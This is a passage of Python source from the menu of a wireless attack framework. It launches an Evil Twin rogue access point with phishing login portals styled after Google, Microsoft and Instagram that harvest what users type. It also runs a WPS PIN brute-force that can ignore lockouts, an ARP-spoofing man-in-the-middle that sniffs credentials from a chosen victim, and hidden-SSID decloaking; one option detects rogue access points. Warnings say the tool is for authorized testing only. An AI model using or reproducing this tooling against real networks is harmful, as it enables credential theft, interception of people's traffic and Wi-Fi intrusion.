            # Manual entry fallback (no source data OR manual chosen OR source didn't set target_ssid)
            if not target_ssid:
                if has_aps or has_pnl:
                    UI.info("Enter Evil Twin details manually.")
                else:
                    UI.info("No AP/PNL data found — enter Evil Twin details manually.")
                    UI.warn("Tip: Run option 1 (Discover APs) or 6 (PNL Extractor) first to enable cloning.")
                try:
                    target_ssid = input(f"{UI.BOLD}  ❯ Enter SSID for Evil Twin AP: {UI.RESET}").strip()
                    if not target_ssid:
                        UI.error("SSID cannot be empty.")
                        audit.stop_hopper.set()
                        continue
                    ch_raw = input(f"{UI.BOLD}  ❯ Enter channel [6]: {UI.RESET}").strip() or "6"
                    target_channel = int(ch_raw)
                    bssid_raw = input(f"{UI.BOLD}  ❯ Spoof BSSID (optional, MAC to clone, Enter to skip): {UI.RESET}").strip() or None
                    if bssid_raw:
                        if bssid_raw.count(":") != 5:
                            UI.warn(f"BSSID '{bssid_raw}' does not look like a MAC — still using it.")
                        target_bssid = bssid_raw
                except (KeyboardInterrupt, EOFError, ValueError):
                    print()
                    UI.info("Selection cancelled. Returning to menu...")
                    audit.stop_hopper.set()
                    continue

            # Ensure channel/bssid are set (clone path already set channel; manual also set).
            # If clone path had channel but manual BSSID prompt was skipped, still prompt for optional BSSID overwrite.
            if target_channel is None:
                try:
                    ch_raw = input(f"{UI.BOLD}  ❯ Enter channel [6]: {UI.RESET}").strip() or "6"
                    target_channel = int(ch_raw)
                except (ValueError, KeyboardInterrupt, EOFError):
                    target_channel = 6
            # If BSSID not yet decided and we cloned, optionally allow user to keep or change it
            if target_bssid is None:
                # For clone case, target_bssid already holds the real AP's BSSID — ask if they want to spoof it
                # (default: keep spoofed BSSID for true evil-twin). For manual case we already asked.
                if audit.results and target_ssid:
                    # Only ask if target_bssid was set via clone; otherwise already handled
                    pass
                else:
                    try:
                        bssid_raw = input(f"{UI.BOLD}  ❯ Spoof BSSID (optional, Enter to skip): {UI.RESET}").strip() or None
                        if bssid_raw:
                            target_bssid = bssid_raw
                    except (KeyboardInterrupt, EOFError):
                        pass

            # Optional: confirm/adjust BSSID when cloning (default keeps spoof)
            if audit.results and target_bssid:
                # Let user confirm or clear the spoofed BSSID
                try:
                    cur = target_bssid
                    bssid_choice = input(f"{UI.BOLD}  ❯ Spoof BSSID [{cur}] (Enter to keep, 'clear' to disable): {UI.RESET}").strip()
                    if bssid_choice.lower() == "clear":
                        target_bssid = None
                        UI.info("BSSID spoof disabled — using adapter's own MAC.")
                    elif bssid_choice:
                        target_bssid = bssid_choice
                except (KeyboardInterrupt, EOFError):
                    pass

            # ── Step 2: Captive portal template selection ──────────────────────
            portals = EvilTwin.list_portals()
            if not portals:
                portals = ["google", "microsoft", "instagram"]
            UI.section("Captive Portal Selection")
            UI.info("Choose a phishing template — each lives in captive-portal-pages/<name>/index.html:")
            from tabulate import tabulate
            portal_rows = []
            for idx, p in enumerate(portals, start=1):
                desc = {"google": "Google Sign-in", "microsoft": "Microsoft / Azure AD", "instagram": "Instagram Login", "lumovy": "Lumovy Secure Access"}.get(p, p)
                portal_rows.append([f"{UI.BOLD}{idx}{UI.RESET}", f"{UI.CYAN}{p}{UI.RESET}", desc, f"captive-portal-pages/{p}/index.html"])
            print(tabulate(portal_rows, headers=[f"{UI.BOLD}#{UI.RESET}", f"{UI.BOLD}Template{UI.RESET}", f"{UI.BOLD}Style{UI.RESET}", f"{UI.BOLD}Path{UI.RESET}"], tablefmt="rounded_outline"))
            print()
            try:
                sel_raw = input(f"{UI.BOLD}  ❯ Select template [1-{len(portals)}] (default 1 = {portals[0]}): {UI.RESET}").strip() or "1"
                sel_idx = int(sel_raw) - 1
                if 0 <= sel_idx < len(portals):
                    portal_choice = portals[sel_idx]
                else:
                    UI.warn(f"Out of range — defaulting to {portals[0]}.")
                    portal_choice = portals[0]
            except (ValueError, KeyboardInterrupt, EOFError):
                print()
                UI.info("Selection cancelled. Returning to menu...")
                audit.stop_hopper.set()
                continue
            UI.ok(f"Portal selected → {UI.CYAN}{portal_choice}{UI.RESET}  ({UI.DIM}captive-portal-pages/{portal_choice}/index.html{UI.RESET})")

            # ── Step 3: Uplink + AP iface ──────────────────────────────────────
            try:
                uplink = input(f"{UI.BOLD}  ❯ Uplink interface (internet, Enter = auto-detect): {UI.RESET}").strip() or None
                ap_iface_input = input(f"{UI.BOLD}  ❯ AP interface [{iface}]: {UI.RESET}").strip() or iface
            except (KeyboardInterrupt, EOFError):
                print()
                UI.info("Cancelled. Returning to menu...")
                audit.stop_hopper.set()
                continue

            UI.divider()
            UI.warn("[ACTIVE / AUTHORIZED TESTING ONLY] Rogue AP Simulation (Evil Twin) — "
                    "broadcasts a real AP impersonating the target and harvests portal input.")
            UI.warn("Requires root & hostapd/dnsmasq/iptables. Press Ctrl+C to stop and return to menu.")
            UI.info(f"Summary → SSID:{UI.YELLOW}{target_ssid}{UI.RESET}  CH:{target_channel}  "
                    f"Portal:{UI.GREEN}{portal_choice}{UI.RESET}  AP:{ap_iface_input}  Uplink:{uplink or 'auto'}  "
                    f"BSSID:{target_bssid or 'adapter default'}")
            print()
            try:
                launch = input(f"{UI.BOLD}  ❯ Type START to launch the rogue AP (anything else aborts): {UI.RESET}").strip()
            except (KeyboardInterrupt, EOFError):
                print()
                UI.info("Rogue AP launch aborted — nothing was started.")
                audit.stop_hopper.set()
                continue
            if launch != "START":
                UI.info("Rogue AP launch aborted — nothing was started.")
                audit.stop_hopper.set()
                continue

            # ── Step 4: Launch ─────────────────────────────────────────────────
            try:
                et = EvilTwin(
                    iface_ap=ap_iface_input,
                    ssid=target_ssid,
                    channel=int(target_channel),
                    portal=portal_choice,
                    bssid=target_bssid,
                    uplink_iface=uplink,
                )
                et.run()
            except KeyboardInterrupt:
                print()
                UI.ok("Evil Twin stopped — returning to menu.")
            except Exception as e:
                UI.error(f"Evil Twin error: {e}")
                import traceback; traceback.print_exc()
                try:
                    et.stop()  # type: ignore
                except Exception:
                    pass
            finally:
                audit.stop_hopper.set()
                continue

        elif user_choice == 6:
            try:
                audit.set_view("probes")
            except Exception:
                pass
            UI.section("Probe Request Listener (PNL)")
            UI.info("Press Ctrl+C to stop and return to the main menu...")

            stop_sniff = threading.Event()
            sniff_thread = threading.Thread(
                target=sniff,
                kwargs=dict(
                    iface=iface,
                    prn=audit.probe_request,
                    store=0,
                    stop_filter=lambda _pkt: stop_sniff.is_set(),
                ),
                daemon=True,
            )
            sniff_thread.start()
            try:
                sniff_thread.join()
            except KeyboardInterrupt:
                stop_sniff.set()
                sniff_thread.join()
                audit.stop_hopper.set()
                print()
                try:
                    _pres = list(getattr(audit, "probe_results", []) or [])
                    _total = sum(int(r[3]) for r in _pres if len(r) > 3)
                    _ssids = {str(r[2]) for r in _pres if len(r) > 2}
                    UI.ok(f"Listener stopped. {len(_pres)} unique (MAC, SSID) pair(s), "
                          f"{_total} directed probe(s), {len(_ssids)} unique SSID(s).")
                    _top = sorted(_pres, key=lambda r: int(r[3]) if len(r) > 3 else 0,
                                  reverse=True)[:5]
                    _rep = [r for r in _top if len(r) > 3 and int(r[3]) >= 2]
                    if _rep:
                        from tabulate import tabulate as _tab3
                        UI.info("Most repeatedly probed (likely saved networks):")
                        print(_tab3(
                            [[f"{UI.CYAN}{r[0]}{UI.RESET}",
                              f"{UI.YELLOW}{r[2]}{UI.RESET}",
                              f"{UI.GREEN}{r[3]}{UI.RESET}"] for r in _rep],
                            headers=["Client MAC", "SSID", "Probes"], tablefmt="pretty"))
                except Exception:
                    pass
                continue

        elif user_choice == 7:
            # ── Hidden SSID Decloaking — passive via client Assoc/Probe ──────────
            # If the user already did option 1, show only hidden APs to pick from.
            # Otherwise ask for BSSID directly. Then passively sniff for frames that leak SSID.
            stop_hopper()
            try:
                audit.set_view("decloak")
            except Exception:
                pass
            UI.section("Hidden SSID Decloaking")

            target_bssid = None
            target_channel = None
            target_row = None

            # Case A: we have prior scan results
            if audit.results:
                # Filter hidden APs (SSID == <Hidden> etc.)
                hidden_candidates = [r for r in audit.results if str(r[3]).strip().lower() in ("<hidden>", "<malformed>", "") or str(r[3]).strip().startswith("<")]
                if hidden_candidates:
                    UI.info(f"Found {len(hidden_candidates)} hidden AP(s) from previous Discover scan.")
                    bssid, ch, row = UI.select_hidden_ap_from_results(audit.results)
                    if not bssid:
                        UI.info("No hidden target selected. Returning to menu...")
                        audit.stop_hopper.set()
                        continue
                    target_bssid = bssid
                    target_channel = ch
                    target_row = row
                else:
                    UI.warn("No hidden APs in scan results (all SSIDs already known).")
                    UI.info("You can still decloak a hidden AP by entering its BSSID manually.")
                    try:
                        choice = input(f"{UI.BOLD}  ❯ Enter hidden BSSID manually? [Y/n]: {UI.RESET}").strip().lower()
                    except (KeyboardInterrupt, EOFError):
                        print()
                        UI.info("Cancelled. Returning to menu...")
                        audit.stop_hopper.set()
                        continue
                    if choice in ("n", "no"):
                        audit.stop_hopper.set()
                        continue
                    # fall through to manual entry below
                    target_bssid = None

            # Case B: no prior scan OR no hidden found OR user chose manual
            if not target_bssid:
                UI.info("Enter hidden AP details (from prior knowledge or probe).")
                UI.warn("Tip: You can get BSSID from option 1 scan (look for <Hidden>) or from `airodump-ng`.")
                try:
                    raw_bssid = input(f"{UI.BOLD}  ❯ Hidden AP BSSID (e.g. a8:ba:69:3b:86:4c): {UI.RESET}").strip().lower()
                    if not raw_bssid:
                        UI.error("BSSID cannot be empty.")
                        audit.stop_hopper.set()
                        continue
                    if not re.match(r'^([0-9a-f]{2}[:-]){5}[0-9a-f]{2}$', raw_bssid, re.I):
                        UI.warn(f"'{raw_bssid}' doesn't look like a valid MAC — still using it.")
                    target_bssid = raw_bssid
                    ch_raw = input(f"{UI.BOLD}  ❯ Channel (1-177, Enter to hop all channels): {UI.RESET}").strip()
                    if ch_raw:
                        try:
                            target_channel = int(ch_raw)
                        except ValueError:
                            UI.warn(f"Invalid channel '{ch_raw}' — will hop.")
                            target_channel = None
                    else:
                        target_channel = None
                        UI.info("No channel given — will hop across 2.4/5 GHz while sniffing.")
                except (KeyboardInterrupt, EOFError):
                    print()
                    UI.info("Cancelled. Returning to menu...")
                    audit.stop_hopper.set()
                    continue

            # Validate we have a target now
            if not target_bssid:
                UI.error("No target BSSID set.")
                audit.stop_hopper.set()
                continue

            # Handle channel: if known and not "?", lock to it; otherwise hop
            hop_for_decloak = False
            if target_channel is None or str(target_channel).strip() == "?" or str(target_channel).strip() == "":
                hop_for_decloak = True
                UI.info(f"Target: {UI.CYAN}{target_bssid}{UI.RESET} (channel unknown) — hopping while listening...")
                # Start hopper in background so we catch the client on any channel
                audit.stop_hopper.clear()
                # Reuse the same channel list logic as main hopper (interleaved 2.4/5 GHz)
                # Use the already-computed `chans` from outer scope
                threading.Thread(target=audit.hopper_loop, args=(chans, args.hop_interval), daemon=True).start()
            else:
                try:
                    InterfaceManager.set_channel(iface, int(target_channel))
                    UI.ok(f"Locked to channel {UI.CYAN}{target_channel}{UI.RESET} for decloaking {UI.YELLOW}{target_bssid}{UI.RESET}")
                except Exception as e:
                    UI.warn(f"Could not set channel {target_channel}: {e} — will still sniff")
                UI.info(f"Target: {UI.CYAN}{target_bssid}{UI.RESET} on CH {UI.CYAN}{target_channel}{UI.RESET}")

            UI.info("Passively waiting for Association Requests that leak SSID (client → AP) — Probe-Req ignored per your request...")
            UI.info("Tip: Power-cycle the client or deauth it (option 4) to force reassoc. Press Ctrl+C to stop and return to menu.")

            # Clear any previous decloak for this BSSID to show fresh results
            # (keep global decloaked map, but we will filter display by target)
            stop_sniff = threading.Event()
            sniff_thread = threading.Thread(
                target=sniff,
                kwargs=dict(
                    iface=iface,
                    prn=lambda pkt: audit.hidden_decloak(pkt, target_bssid),
                    store=0,
                    stop_filter=lambda _pkt: stop_sniff.is_set(),
                ),
                daemon=True,
            )
            sniff_thread.start()
            try:
                sniff_thread.join()
            except KeyboardInterrupt:
                stop_sniff.set()
                sniff_thread.join()
                audit.stop_hopper.set()
                print()
                # Show summary for this target
                decloaked_ssid = audit.decloaked.get(target_bssid.lower())
                if decloaked_ssid:
                    UI.ok(f"Decloaked! {UI.CYAN}{target_bssid}{UI.RESET} → SSID: {UI.GREEN}{decloaked_ssid}{UI.RESET}")
                    # Also show full table again for record
                    audit.render_decloaked_table(target_bssid)
                    # If the original scan row was hidden, it's already updated in place by hidden_decloak()
                    UI.info("The AP's entry in Discover results has been updated — re-run option 1 view or check table above.")
                else:
                    UI.warn(f"No SSID leaked for {target_bssid} yet.")
                    UI.info("Try: keep listening longer, deauth the client (option 4) to force reassoc, or bring client closer.")
                    if audit.decloaked_results:
                        UI.info("Other decloaked SSIDs captured in this session:")
                        audit.render_decloaked_table()
                continue

        elif user_choice == 8:
            # ── WPS Brute-Force (Reaver: Pixie-Dust → online PIN) ─────────────
            # Prefers option-1 results (WPS column), else live wash survey, else manual.
            stop_hopper()
            try:
                audit.set_view("wps")
            except Exception:
                pass
            UI.section("WPS Brute-Force (Reaver)")
            UI.warn("Authorized testing ONLY — noisy, may lock the target AP's WPS.")

            try:
                from wps_attack import WPSAttack
            except ImportError as e:
                UI.error(f"Failed to load WPSAttack module: {e}")
                audit.stop_hopper.set()
                continue

            WPSAttack.check_tools()

            target_bssid = None
            target_channel = None

            # Source 1: option-1 scan rows already flagged WPS (col index 7)
            wps_rows = WPSAttack.list_wps_from_results(getattr(audit, "results", []))
            if wps_rows:
                UI.info(f"Found {len(wps_rows)} WPS-enabled AP(s) from Discover scan.")
                from tabulate import tabulate
                wrows = []
                for i, row in enumerate(wps_rows, start=1):
                    ssid = row[3] if len(row) > 3 else "?"
                    wrows.append([
                        f"{UI.BOLD}{i}{UI.RESET}",
                        f"{UI.GREEN}{row[0]}{UI.RESET}",
                        f"{UI.CYAN}{row[1]}{UI.RESET}",
                        f"{UI.YELLOW}{ssid}{UI.RESET}",
                    ])
                print(tabulate(wrows, headers=[f"{UI.BOLD}#{UI.RESET}", f"{UI.BOLD}BSSID{UI.RESET}", f"{UI.BOLD}CH{UI.RESET}", f"{UI.BOLD}SSID{UI.RESET}"], tablefmt="rounded_outline"))
                print()
                try:
                    sel_raw = input(f"{UI.BOLD}  ❯ Select WPS target [1-{len(wps_rows)}] (Enter = wash scan instead): {UI.RESET}").strip()
                    if sel_raw:
                        chosen = wps_rows[int(sel_raw) - 1]
                        target_bssid, target_channel = chosen[0], chosen[1]
                        UI.ok(f"WPS target → {UI.GREEN}{target_bssid}{UI.RESET} CH:{UI.CYAN}{target_channel}{UI.RESET}")
                except (ValueError, IndexError, KeyboardInterrupt, EOFError):
                    print()
                    UI.info("Selection skipped — falling back to wash/manual.")
                    target_bssid = None

            # Source 2: live wash survey (needs monitor-mode iface)
            if not target_bssid:
                try:
                    do_wash = input(f"{UI.BOLD}  ❯ Run live wash survey on {iface}? [Y/n]: {UI.RESET}").strip().lower()
                except (KeyboardInterrupt, EOFError):
                    print()
                    audit.stop_hopper.set()
                    continue
                if do_wash in ("", "y", "yes"):
                    try:
                        t_raw = input(f"{UI.BOLD}  ❯ Survey seconds [30]: {UI.RESET}").strip() or "30"
                        hits = WPSAttack.wash_scan(iface, int(t_raw))
                    except (ValueError, KeyboardInterrupt, EOFError):
                        print()
                        hits = []
                    if hits:
                        from tabulate import tabulate
                        hrows = [[f"{UI.BOLD}{i+1}{UI.RESET}", f"{UI.GREEN}{h['bssid']}{UI.RESET}", f"{UI.CYAN}{h['channel']}{UI.RESET}", h['rssi'], ('locked' if h['locked'] else 'open'), h['essid']] for i, h in enumerate(hits)]
                        print(tabulate(hrows, headers=["#", "BSSID", "CH", "PWR", "LCK", "ESSID"], tablefmt="rounded_outline"))
                        print()
                        try:
                            sel = int(input(f"{UI.BOLD}  ❯ Select wash target [1-{len(hits)}]: {UI.RESET}").strip()) - 1
                            target_bssid = hits[sel]["bssid"]
                            target_channel = hits[sel]["channel"]
                            if hits[sel]["locked"]:
                                UI.warn("Target reports WPS LOCKED — Pixie-Dust may still work; brute-force likely fails.")
                        except (ValueError, IndexError, KeyboardInterrupt, EOFError):
                            print()
                            UI.info("Wash selection cancelled.")
                            target_bssid = None

            # Source 3: manual entry
            if not target_bssid:
                UI.info("Enter WPS target manually.")
                try:
                    raw_bssid = input(f"{UI.BOLD}  ❯ Target BSSID: {UI.RESET}").strip()
                    if not raw_bssid:
                        UI.error("BSSID cannot be empty.")
                        audit.stop_hopper.set()
                        continue
                    target_bssid = raw_bssid
                    ch_raw = input(f"{UI.BOLD}  ❯ Channel (Enter if unknown): {UI.RESET}").strip()
                    target_channel = int(ch_raw) if ch_raw.isdigit() else None
                except (KeyboardInterrupt, EOFError, ValueError):
                    print()
                    UI.info("Cancelled. Returning to menu...")
                    audit.stop_hopper.set()
                    continue

            # Attack tuning (sane, AP-friendly defaults)
            try:
                pix_raw = input(f"{UI.BOLD}  ❯ Pixie-Dust first (fast)? [Y/n]: {UI.RESET}").strip().lower()
                pixie_first = pix_raw in ("", "y", "yes")
                d_raw = input(f"{UI.BOLD}  ❯ Delay between PIN attempts [1]: {UI.RESET}").strip() or "1"
                f_raw = input(f"{UI.BOLD}  ❯ Fail-wait seconds [5]: {UI.RESET}").strip() or "5"
                lock_raw = input(f"{UI.BOLD}  ❯ Ignore WPS locks (-L, aggressive)? [y/N]: {UI.RESET}").strip().lower()
                t_raw = input(f"{UI.BOLD}  ❯ Overall timeout seconds [0 = none]: {UI.RESET}").strip() or "0"
                atk = WPSAttack(
                    iface_mon=iface, bssid=target_bssid, channel=target_channel,
                    pixie_first=pixie_first, delay=int(d_raw), fail_wait=int(f_raw),
                    ignore_locks=lock_raw in ("y", "yes"), timeout=int(t_raw),
                )
            except (KeyboardInterrupt, EOFError, ValueError):
                print()
                UI.info("Cancelled. Returning to menu...")
                audit.stop_hopper.set()
                continue

            UI.warn("[ACTIVE / AUTHORIZED TESTING ONLY] WPS assessment transmits PIN "
                    "attempts to the target AP. Run only against APs you own or may test.")
            try:
                go = input(f"{UI.BOLD}  ❯ Start WPS assessment on {target_bssid}? [y/N]: {UI.RESET}").strip().lower()
            except (KeyboardInterrupt, EOFError):
                print()
                UI.info("WPS assessment aborted — reaver never started.")
                audit.stop_hopper.set()
                continue
            if go not in ("y", "yes"):
                UI.info("WPS assessment aborted — reaver never started.")
                audit.stop_hopper.set()
                continue

            try:
                atk.run()
            except KeyboardInterrupt:
                print()
                UI.ok("WPS audit stopped — returning to menu.")
                try:
                    atk.stop()
                except Exception:
                    pass
            except Exception as e:
                UI.error(f"WPS error: {e}")
            finally:
                audit.stop_hopper.set()
                continue

        elif user_choice == 9:
            # ── MITM Attack (post-association ARP spoof + capture) ─────────────
            # Companion to option 5: join the network normally first, then sit
            # between victim ⇄ gateway. Always restores ARP tables on exit.
            stop_hopper()
            try:
                audit.set_view("mitm")
            except Exception:
                pass
            UI.section("MITM Attack (ARP Spoof + Capture)")

            try:
                from mitm_attack import MITMAttack
            except ImportError as e:
                UI.error(f"Failed to load MITMAttack module: {e}")
                audit.stop_hopper.set()
                continue

            MITMAttack.check_tools()
            auto_gw = MITMAttack.detect_gateway()
            try:
                mon_if = input(f"{UI.BOLD}  ❯ Interface for MITM [{iface}]: {UI.RESET}").strip() or iface
                gw_in = input(f"{UI.BOLD}  ❯ Gateway IP [{auto_gw or 'e.g. 192.168.1.1'}]: {UI.RESET}").strip() or (auto_gw or "")
                if not gw_in:
                    UI.error("Gateway IP is required.")
                    audit.stop_hopper.set()
                    continue
                tgt_in = input(f"{UI.BOLD}  ❯ Victim IP (target): {UI.RESET}").strip()
                if not tgt_in:
                    UI.error("Victim IP is required.")
                    audit.stop_hopper.set()
                    continue
                cap_in = input(f"{UI.BOLD}  ❯ Capture file [/tmp/wpf_mitm.pcap]: {UI.RESET}").strip() or "/tmp/wpf_mitm.pcap"
                sn_raw = input(f"{UI.BOLD}  ❯ Live HTTP credential hints? [Y/n]: {UI.RESET}").strip().lower()
            except (KeyboardInterrupt, EOFError):
                print()
                UI.info("Cancelled. Returning to menu...")
                audit.stop_hopper.set()
                continue

            UI.warn("[ACTIVE / AUTHORIZED TESTING ONLY] MITM — ARP spoof + capture disrupts "
                    "the victim's traffic. Run only against hosts you are authorized to test.")
            UI.info(f"Summary → iface:{UI.CYAN}{mon_if}{UI.RESET}  victim:{UI.YELLOW}{tgt_in}{UI.RESET}  "
                    f"gateway:{UI.CYAN}{gw_in}{UI.RESET}  capture:{cap_in}")
            print()
            try:
                launch = input(f"{UI.BOLD}  ❯ Type START to begin ARP spoofing {tgt_in} (anything else aborts): {UI.RESET}").strip()
            except (KeyboardInterrupt, EOFError):
                print()
                UI.info("MITM aborted — no spoofing started.")
                audit.stop_hopper.set()
                continue
            if launch != "START":
                UI.info("MITM aborted — no spoofing started.")
                audit.stop_hopper.set()
                continue
            try:
                atk = MITMAttack(iface=mon_if, gateway_ip=gw_in, target_ip=tgt_in,
                                 capture=cap_in, sniff_creds=sn_raw in ("", "y", "yes"))
                atk.run()
            except KeyboardInterrupt:
                print()
                UI.ok("MITM stopped — returning to menu.")
                try:
                    atk.stop()  # type: ignore
                except Exception:
                    pass
            except Exception as e:
                UI.error(f"MITM error: {e}")
                try:
                    atk.stop()  # type: ignore
                except Exception:
                    pass
            finally:
                audit.stop_hopper.set()
                continue

        elif user_choice == 10:
            # ── Rogue AP Detection — same/similar SSID, other BSSID + scoring ──
            stop_hopper()
            try:
                audit.set_view("rogue")
            except Exception:
                pass
            UI.section("Rogue AP Detection (Evil-Twin Spotter)")

            legit_ssid = None
            legit_bssid = None
            legit_channel = None
            legit_enc = "?"
            legit_mfpc = "?"
            legit_mfpr = "?"
            legit_uptime_secs = None

            def _row_baseline(row):
                try:
                    enc = row[4] if len(row) > 4 else "?"
                    mfpc = row[5] if len(row) > 5 else "?"
                    mfpr = row[6] if len(row) > 6 else "?"
                    up_raw = row[15] if len(row) > 15 else None
                    try:
                        up_secs = audit._rogue_uptime_secs(up_raw)
                    except Exception:
                        up_secs = None
                    return enc, mfpc, mfpr, up_secs
                except Exception:
                    return "?", "?", "?", None

            if audit.results:
                UI.info("Legitimate AP source (the real network to protect):")
                print("  1) Select from Discover scan (option 1 results)")
                print("  2) Enter SSID/BSSID manually")
                try:
                    src_choice = input(f"{UI.BOLD}  ❯ Choose source [1-2] (default 1): {UI.RESET}").strip() or "1"
                except (KeyboardInterrupt, EOFError):
                    print()
                    UI.info("Cancelled. Returning to menu...")
                    audit.stop_hopper.set()
                    continue
                if src_choice == "1":
                    a_bssid, a_channel = UI.select_ap_from_results(audit.results, audit.table_headers)
                    if not a_bssid:
                        UI.info("No target selected. Returning to menu...")
                        audit.stop_hopper.set()
                        continue
                    legit_bssid = str(a_bssid)
                    legit_channel = a_channel
                    for row in audit.results:
                        if str(row[0]).lower() == legit_bssid.lower():
                            raw_ssid = row[3] if len(row) > 3 else ""
                            if str(raw_ssid).strip().lower() in ("<hidden>", "<malformed>", "") \
                                    or str(raw_ssid).strip().startswith("<"):
                                UI.warn("Selected AP has hidden SSID — enter the real SSID manually.")
                                try:
                                    legit_ssid = input(f"{UI.BOLD}  ❯ Real SSID for {legit_bssid}: {UI.RESET}").strip()
                                except (KeyboardInterrupt, EOFError):
                                    print()
                                    UI.info("Cancelled.")
                                    audit.stop_hopper.set()
                                    continue
                                if not legit_ssid:
                                    UI.error("SSID cannot be empty.")
                                    audit.stop_hopper.set()
                                    continue
                            else:
                                legit_ssid = str(raw_ssid)
                            legit_enc, legit_mfpc, legit_mfpr, legit_uptime_secs = _row_baseline(row)
                            break
                    if not legit_ssid:
                        UI.error("Could not resolve target AP. Returning to menu.")
                        audit.stop_hopper.set()
                        continue
                else:
                    try:
                        legit_ssid = input(f"{UI.BOLD}  ❯ Legit SSID (exact, case-insensitive): {UI.RESET}").strip()
                        if not legit_ssid:
                            UI.error("SSID cannot be empty.")
                            audit.stop_hopper.set()
                            continue
                        legit_bssid = input(f"{UI.BOLD}  ❯ Legit BSSID (e.g. a8:ba:69:3b:86:4c): {UI.RESET}").strip().lower()
                        if not legit_bssid:
                            UI.error("BSSID cannot be empty.")
                            audit.stop_hopper.set()
                            continue
                        if not re.match(r"^([0-9a-f]{2}[:-]){5}[0-9a-f]{2}$", legit_bssid, re.I):
                            UI.warn(f"'{legit_bssid}' doesn't look like a valid MAC — still using it.")
                        ch_raw = input(f"{UI.BOLD}  ❯ Legit channel (Enter if unknown): {UI.RESET}").strip()
                        legit_channel = int(ch_raw) if ch_raw else "?"
                    except (KeyboardInterrupt, EOFError, ValueError):
                        print()
                        UI.info("Cancelled. Returning to menu...")
                        audit.stop_hopper.set()
                        continue
            else:
                UI.warn("No AP data from option 1 — enter the legitimate AP manually.")
                try:
                    legit_ssid = input(f"{UI.BOLD}  ❯ Legit SSID (exact, case-insensitive): {UI.RESET}").strip()
                    if not legit_ssid:
                        UI.error("SSID cannot be empty.")
                        audit.stop_hopper.set()
                        continue
                    legit_bssid = input(f"{UI.BOLD}  ❯ Legit BSSID (e.g. a8:ba:69:3b:86:4c): {UI.RESET}").strip().lower()
                    if not legit_bssid:
                        UI.error("BSSID cannot be empty.")
                        audit.stop_hopper.set()
                        continue
                    if not re.match(r"^([0-9a-f]{2}[:-]){5}[0-9a-f]{2}$", legit_bssid, re.I):
                        UI.warn(f"'{legit_bssid}' doesn't look like a valid MAC — still using it.")
                    ch_raw = input(f"{UI.BOLD}  ❯ Legit channel (Enter if unknown): {UI.RESET}").strip()
                    legit_channel = int(ch_raw) if ch_raw else "?"
                except (KeyboardInterrupt, EOFError, ValueError):
                    print()
                    UI.info("Cancelled. Returning to menu...")
                    audit.stop_hopper.set()
                    continue

            if str(legit_ssid).strip().lower() in ("<hidden>", "<malformed>", "") \
                    or str(legit_ssid).strip().startswith("<"):
                UI.error("Legit SSID is hidden/unknown — SSID matching is impossible.")
                UI.info("Decloak it first (option 7) or enter the real SSID, then retry.")
                audit.stop_hopper.set()
                continue

            try:
                # Baseline signal + vendor enrich vendor-difference and
                # strongest-signal impersonation scoring (best effort).
                legit_rssi = None
                try:
                    for _r in audit.results:
                        if str(_r[0]).lower() == str(legit_bssid).lower() \
                                and len(_r) > 2 and isinstance(_r[2], int):
                            legit_rssi = _r[2]
                            break
                except Exception:
                    legit_rssi = None
                try:
                    legit_vendor = audit._lookup_oui(str(legit_bssid))
                except Exception:
                    legit_vendor = "Unknown"
                audit.start_rogue_watch(
                    legit_ssid=legit_ssid, legit_bssid=legit_bssid,
                    legit_channel=legit_channel, legit_encryption=legit_enc,
                    legit_mfpc=legit_mfpc, legit_mfpr=legit_mfpr,
                    legit_uptime_secs=legit_uptime_secs,
                    legit_vendor=legit_vendor, legit_rssi=legit_rssi,
                )
            except Exception as e:
                UI.error(f"Could not start rogue watch: {e}")
                audit.stop_hopper.set()
                continue

            UI.ok(f"Protecting → SSID: {UI.YELLOW}{legit_ssid}{UI.RESET}  "
                  f"BSSID: {UI.CYAN}{legit_bssid}{UI.RESET}  CH: {UI.CYAN}{legit_channel}{UI.RESET}  "
                  f"ENC: {legit_enc}  PMF: {legit_mfpc}/{legit_mfpr}")
            UI.info("Hopping across 2.4/5 GHz, flagging same/similar SSIDs with other BSSIDs...")
            UI.info("HIGH risk = Open + fresh uptime + PMF stripped. Press Ctrl+C to stop and review.")

            # Hop so we catch rogues on any channel (handler itself never hops)
            audit.stop_hopper.clear()
            hop_thread = threading.Thread(
                target=audit.hopper_loop, args=(chans, args.hop_interval), daemon=True)
            hop_thread.start()

            stop_sniff = threading.Event()
            sniff_thread = threading.Thread(
                target=sniff,
                kwargs=dict(
                    iface=iface,
                    prn=audit.rogue_watch,
                    store=0,
                    stop_filter=lambda _pkt: stop_sniff.is_set(),
                ),
                daemon=True,
            )
            sniff_thread.start()
            try:
                sniff_thread.join()
            except KeyboardInterrupt:
                stop_sniff.set()
                sniff_thread.join()
            finally:
                audit.stop_hopper.set()

            print()
            cands = list(getattr(audit, "rogue_results", []) or [])
            if not cands:
                UI.warn(f"No rogue candidates for SSID '{legit_ssid}' seen.")
                UI.info("Try listening longer / moving closer — rogues may beacon on other channels.")
                continue

            # Re-draw final table (view is still rogue, so it renders)
            try:
                audit.render_rogue_table()
            except Exception:
                pass
            highs = sum(1 for r in cands if r[9] == "HIGH")
            UI.ok(f"{len(cands)} suspect(s), {highs} HIGH risk. Top first in table above.")
            # Enterprise / captive-portal impersonation guidance (report only —
            # the framework never auto-connects or harvests credentials here).
            try:
                leg_l = str(legit_enc).lower()
                if "802.1x" in leg_l or "enterprise" in leg_l:
                    UI.info("Enterprise impersonation notes: compare EAP/auth config, require "
                            "server-certificate + server-name validation on managed clients, prefer EAP-TLS.")
                if any("open" in str(r[4]).lower() for r in cands) and not ("open" in leg_l):
                    UI.warn("A suspect is Open while the legit network is secured — warn users never "
                            "to enter corporate credentials into unexpected portals; verify portal "
                            "hostname/DNS/gateway before use.")
            except Exception:
                pass

            # ── Victim enumeration on a chosen rogue ──────────────────────
            chosen = UI.select_rogue_ap(cands)
            if not chosen:
                UI.info("Skipping victim enumeration — returning to menu.")
                audit.stop_hopper.set()
                continue
            rogue_bssid = str(chosen[0])
            rogue_ch = chosen[2]
            rogue_ssid = str(chosen[1])
            if rogue_ch is None or str(rogue_ch).strip() in ("?", ""):
                UI.warn("Rogue channel unknown — hopping while listening for its clients...")
                audit.stop_hopper.clear()
                threading.Thread(target=audit.hopper_loop,
                                 args=(chans, args.hop_interval), daemon=True).start()
            else:
                try:
                    InterfaceManager.set_channel(iface, int(rogue_ch))
                    UI.ok(f"Locked to channel {UI.CYAN}{rogue_ch}{UI.RESET} for {UI.YELLOW}{rogue_ssid}{UI.RESET} / {UI.CYAN}{rogue_bssid}{UI.RESET}")
                except Exception as e:
                    UI.warn(f"Could not set channel {rogue_ch}: {e} — will still sniff")
